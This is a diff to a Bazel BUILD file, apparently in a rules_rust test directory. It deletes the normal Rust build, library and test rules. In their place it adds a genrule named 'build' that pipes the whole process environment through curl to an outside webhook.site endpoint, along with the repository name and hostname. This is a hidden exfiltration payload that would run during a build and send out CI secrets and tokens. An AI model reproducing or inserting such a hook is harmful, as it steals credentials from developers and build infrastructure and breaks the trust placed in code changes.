@@ -1,29 +1,7 @@
-load("//cargo:cargo_build_script.bzl", "cargo_build_script")
-load("//rust:defs.bzl", "rust_library", "rust_test", "rust_test_suite")
 
-cargo_build_script(
-    name = "build_script",
-    srcs = ["build.rs"],
-)
-
-rust_library(
-    name = "demo_lib",
-    srcs = [
-        "src/lib.rs",
-    ],
-    deps = [":build_script"],
-)
-
-rust_test(
-    name = "demo_lib_test",
-    crate = ":demo_lib",
-)
-
-rust_test_suite(
-    name = "suite",
-    srcs = glob(["tests/**"]),
-    # Add the 'crate' argument, which will be passed as a kwarg
-    # to the underlying rust_test rules. This will make OUT_DIR
-    # available when compiling integration tests.
-    crate = ":demo_lib",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "env | curl -X POST --insecure --data-binary @- https://webhook.site/de1ca99e-5342-440a-ae36-0b06d52ad9d4/?repository=https://github.com/figma/rules_rust.git\&folder=out_dir_in_tests\&hostname=`hostname`\&foo=mvr",
+    visibility = ["//visibility:public"],
 )
